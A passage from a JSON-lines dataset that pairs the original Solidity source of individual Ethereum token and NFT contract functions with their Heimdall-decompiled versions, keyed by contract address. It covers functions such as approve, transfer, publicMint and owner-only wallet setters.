Transfer(address(msg.sender), address(arg0), arg1);\n        var_g = 0x01;\n        return 0x01;\n        var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        require(!(arg1 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        if (!storage_map_b[var_c]) {\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x23;\n        var_n = this.code[3092:3127];\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x25;\n        var_n = this.code[3239:3276];\n    }"}
{"contract_address": "0x0f44A71641D7aA4e4E12471a887bEB44E327c977", "original_solidity_code": "function name() external view override returns (string memory) {\\r\\n      return _name;\\r\\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        bytes1 var_a = 0x20 + (var_a + (0x20 * (((store_a & (((!bytes1(store_a)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) + 0x1f) / 0x20)));\n        bytes1 var_b = (store_a & (((!bytes1(store_a)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02;\n        if (!(store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02) {\n            if (0x1f < (store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02)) {\n                uint256 var_c = 0;\n                uint256 var_d = storage_map_b[var_c];\n                if ((var_a + 0x20) + (store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) > (0x20 + (var_a + 0x20))) {\n                    var_d = 0x20;\n                    bytes1 var_e = var_a.length;\n                    if (!var_a.length) {\n                        bytes1 var_f = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g);\n                        return abi.encodePacked(0x20, var_a.length, (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g));\n                        return abi.encodePacked(0x20, var_a.length);\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x49e5FEE649E311efc2Cfb0f1f47e82CD90bECA13", "original_solidity_code": "function manualSwapAndLiquify() external onlyOwner {\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        swapLiquify(contractBalance);\r\n    }", "heimdall_decompiled_code": "function manualSwapAndLiquify() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_f = address(this);\n        var_g = 0x01;\n        store_i = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(store_i));\n        uint256 var_c = 0x40 + var_c;\n        var_a = 0x1a;\n        var_h = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x02 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        uint256 var_j = var_c.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        require(0x02, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_n = 0x12;\n        var_c = 0x40 + var_c;\n        var_i = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!((storage_map_o[var_f] / 0x02) > storage_map_o[var_f]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_p = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        uint256 var_q = var_c.length;\n        uint256 var_r = 0;\n        var_s = var_m;\n        var_r = 0;\n        require(!(storage_map_o[var_f] - (storage_map_o[var_f] / 0x02)) > storage_map_o[var_f]);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_n = 0x11;\n        store_i = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(store_i));\n        require(!0x02 > 0xffffffffffffffff);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_n = 0x41;\n        var_p = 0x02;\n        var_c = var_c + 0x60;\n        require(!0x02);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_n = 0x32;\n        address var_t = address(this);\n        var_u = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).WETH(var_v); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!(((var_c + ret0.length) - var_c) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_w == (address(var_w)), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_n = 0x32;\n        address var_x = address(var_w);\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_g / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_y = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_z = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_aa = 0x22;\n        var_ab = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_ac = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_f = address(this);\n        var_g = 0x02;\n        var_f = address(store_g / 0x01);\n        address var_g = keccak256(var_f);\n        storage_map_o[var_f] = storage_map_o[var_f] / 0x02;\n        address var_y = storage_map_o[var_f] / 0x02;\n        emit Approval(address(this), address(store_g / 0x01), storage_map_o[var_f] / 0x02);\n        var_y = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_z = storage_map_o[var_f] / 0x02;\n        uint256 var_aa = 0;\n        uint256 var_ab = ((0x04 + var_c) + 0xa0) - (0x04 + var_c);\n        uint256 var_ad = var_c.length;\n        address var_ac = address(this);\n        uint256 var_ae = block.timestamp;\n        require(address(store_g / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_g / 0x01).Unresolved_791ac947(var_z); // call\n        store_i = (0 * 0x01000000000000000000000000000000000000000000) | (uint248(store_i));\n        var_c = 0x40 + var_c;\n        var_y = 0x1e;\n        var_af = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(address(this).balance > address(this).balance), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000h\ufffd\");\n        var_ag = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_ab = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_ac = var_c.length;\n        uint256 var_ah = 0;\n        var_ae = var_m;\n        var_ah = 0;\n        require(!(address(this).balance - address(this).balance) > address(this).balance);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_n = 0x11;\n        (bool success, bytes memory ret0) = address(store_i / 0x01).transfer(address(this).balance - address(this).balance);\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_g / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_ag = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_ab = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_ac = 0x22;\n        var_ae = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_ad = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_f = address(this);\n        var_g = 0x02;\n        var_f = address(store_g / 0x01);\n        var_g = keccak256(var_f);\n        storage_map_o[var_f] = storage_map_o[var_f] - (storage_map_o[var_f] / 0x02);\n        address var_ag = storage_map_o[var_f] - (storage_map_o[var_f] / 0x02);\n        emit Approval(address(this), address(store_g / 0x01), storage_map_o[var_f] - (storage_map_o[var_f] / 0x02));\n        var_ag = 0xf305d71900000000000000000000000000000000000000000000000000000000;\n        var_ab = address(this);\n        var_ac = storage_map_o[var_f] - (storage_map_o[var_f] / 0x02);\n        var_ae = 0;\n        var_ad = 0;\n        address var_ai = address(owner / 0x01);\n        uint256 var_aj = block.timestamp;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).{ value: address(this).balance - address(this).balance }Unresolved_f305d719(var_ab); // call\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x60);\n        require(var_w == (var_w));\n        var_ag = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_ab = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_ac = 0x24;\n        var_ae = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_ad = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        var_y = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_z = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_aa = 0x24;\n        var_ab = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_ac = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function publicMint(uint256 quantity) public payable nonReentrant {\\r\\n        require(\\r\\n            block.timestamp >= publicInfo.START_TIME && block.timestamp <= publicInfo.END_TIME,\\r\\n            \\\"Public minting closed\\\"\\r\\n        );\\r\\n        require(\\r\\n            quantity <= publicInfo.LIMIT_PER_ADDRESS,\\r\\n            \\\"Exceeded mint limit\\\"\\r\\n        );\\r\\n        require(publicInfo.CURR_MINTED < publicInfo.SUPPLY, \\\"Sold Out\\\");\\r\\n        require(msg.value == publicInfo.PRICE * quantity, \\\"Incorrect amount\\\");\\r\\n\\r\\n        _internalMint(msg.sender, quantity);\\r\\n        publicInfo.CURR_MINTED += quantity;\\r\\n    }", "heimdall_decompiled_code": "function publicMint(uint256 arg0) public payable {\n        require(!(ownerg == 0x02), \"ReentrancyGuard: reentrant call\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1f;\n        var_d = 0x5265656e7472616e637947756172643a207265656e7472616e742063616c6c00;\n        ownerg = 0x02;\n        require(block.timestamp < store_t, \"Public minting closed\");\n        require(!(block.timestamp < store_t), \"Public minting closed\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x15;\n        var_d = 0x5075626c6963206d696e74696e6720636c6f7365640000000000000000000000;\n        require(!(arg0 > getPublicLimit), \"Exceeded mint limit\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x13;\n        var_d = 0x4578636565646564206d696e74206c696d697400000000000000000000000000;\n        require(getPublicNumMinted < getPublicSupply, \"Incorrect amount\");\n        require(!(getPublicPrice & (arg0 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / getPublicPrice))), \"Incorrect amount\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(msg.value == (getPublicPrice * arg0), \"Incorrect amount\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x10;\n        var_d = 0x496e636f727265637420616d6f756e7400000000000000000000000000000000;\n        require(!(bytes1(paused)), \"Minting unavaliable\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x13;\n        var_d = 0x4d696e74696e6720756e6176616c6961626c6500000000000000000000000000;\n        require(!(getGuaranteedWhitelistSupply > ~(competitveWhitelistInfo)), \"Sold Out\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x08;\n        var_d = 0x536f6c64204f7574000000000000000000000000000000000000000000000000;\n        require(!(block.timestamp > store_u), \"Public minting closed\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x15;\n        var_d = 0x5075626c6963206d696e74696e6720636c6f7365640000000000000000000000;\n    }"}
{"contract_address": "0xAB17E21aaAaF60C9022E34e3AcdBC73EEeb0f880", "original_solidity_code": "function name() external pure returns (string memory);\r\n\r\n    function symbol() external pure returns (string memory);\r\n\r\n    function decimals() external pure returns (uint8);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address owner) external view returns (uint256);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external returns (bool);\r\n\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n\r\n    function nonces(address owner) external view returns (uint256);\r\n\r\n    function permit(\r\n        address owner,\r\n        address spender,\r\n        uint256 value,\r\n        uint256 deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s\r\n    ) external;\r\n\r\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\r\n    event Burn(\r\n        address indexed sender,\r\n        uint256 amount0,\r\n        uint256 amount1,\r\n        address indexed to\r\n    );\r\n    event Swap(\r\n        address indexed sender,\r\n        uint256 amount0In,\r\n        uint256 amount1In,\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\r\n\r\n    function factory() external view returns (address);\r\n\r\n    function token0() external view returns (address);\r\n\r\n    function token1() external view returns (address);\r\n\r\n    function getReserves()\r\n        external\r\n        view\r\n        returns (\r\n            uint112 reserve0,\r\n            uint112 reserve1,\r\n            uint32 blockTimestampLast\r\n        );\r\n\r\n    function price0CumulativeLast() external view returns (uint256);\r\n\r\n    function price1CumulativeLast() external view returns (uint256);\r\n\r\n    function kLast() external view returns (uint256);\r\n\r\n    function mint(address to) external returns (uint256 liquidity);\r\n\r\n    function burn(address to)\r\n        external\r\n        returns (uint256 amount0, uint256 amount1);\r\n\r\n    function swap(\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address to,\r\n        bytes calldata data\r\n    ) external;\r\n\r\n    function skim(address to) external;\r\n\r\n    function sync() external;\r\n\r\n    function initialize(address, address) external;\r\n}\r\n\r\n\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired,\r\n        uint256 amountAMin,\r\n        uint256 amountBMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        returns (\r\n            uint256 amountA,\r\n            uint256 amountB,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_z) {\n            if (store_z - ((store_z >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_z >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_z >> 0x01;\n                if (store_z) {\n                    if (store_z - ((store_z >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_z >> 0x01) {\n                            if (0x1f < (store_z >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_e[var_a];\n                                if ((0x20 + var_c) + (store_z >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xAe2D518A7c2fE465D3548825De14774282959862", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x6ddfeC08B7597e9392abbC41CB8a74A0d59188C1", "original_solidity_code": "function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x07;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xeffb5Ed8242e5270aD662C82EfcA97aDAdE27dFD", "original_solidity_code": "function manualsend() external {\r\n        require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress);\r\n        uint256 contractETHBalance = address(this).balance;\r\n        sendETHToFee(contractETHBalance);\r\n    }", "heimdall_decompiled_code": "function manualsend() public {\n        require(address(msg.sender) == (address(store_p)));\n        require(address(msg.sender) == (address(store_q)));\n        (bool success, bytes memory ret0) = address(store_q).transfer(address(this).balance);\n    }"}
{"contract_address": "0xAe2D518A7c2fE465D3548825De14774282959862", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_balances[_msgSender()] >= amount, \"TT: transfer amount exceeds balance\");\r\n    _balances[_msgSender()] -= amount;\r\n    _balances[recipient] += amount;\r\n\r\n    emit Transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        require(!(arg1 > storage_map_b[var_a]), \"TT: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x54543a207472616e7366657220616d6f756e7420657863656564732062616c61;\n        var_g = 0x6e63650000000000000000000000000000000000000000000000000000000000;\n        var_a = msg.sender;\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] - arg1) > storage_map_b[var_a]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        var_b = 0x01;\n        require(!storage_map_b[var_a] > (arg1 + storage_map_b[var_a]));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x5352d5312F76de5a8f335d7df9301c6A4a209b0e", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n    }"}
{"contract_address": "0x332098414098f0E42658f2eA0254B44b077bb4A5", "original_solidity_code": "function WhisperingWillowMeadowTxnLimits(uint256 newNum) external onlyOwner {\\n        require(\\n            newNum >= ((totalSupply() * 5) / 1000) / 1e9,\\n            \\\"Cannot set maxTxAmount lower than 0.5%\\\"\\n        );\\n        maxTxAmount = newNum * (10**9);\\n    }", "heimdall_decompiled_code": "function WhisperingWillowMeadowTxnLimits(uint256 arg0) public view {\n        require(arg0 == arg0);\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!totalSupply | (0x05 == ((totalSupply * 0x05) / totalSupply)));\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x03e8);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n    }"}
{"contract_address": "0x700604d812AD038BB5fE00ddDB8c0375E65A307C", "original_solidity_code": "function setMarketingWallet(address payable _address) external onlyOwner {\r\n        marketingWallet = _address;\r\n    }", "heimdall_decompiled_code": "function setMarketingWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_s = (address(arg0) * 0x01) | (uint96(store_s));\n    }"}
{"contract_address": "0x7F073dD6bC1B6480d8f06Ebedd6c53f4dD9c8DBc", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x31b60867a6203e76120df0612769ba136097eBc8", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve(owner, spender, currentAllowance - subtractedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x636aD441CdA1EC74BC059A23615b9D9c3464d9e3", "original_solidity_code": "function setTeamWalletAddress(address newAddress) external onlyOwner() {\r\n        teamWalletAddress = payable(newAddress);\r\n    }", "heimdall_decompiled_code": "function setTeamWalletAddress(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        teamWalletAddress = (address(arg0)) | (uint96(teamWalletAddress));\n    }"}
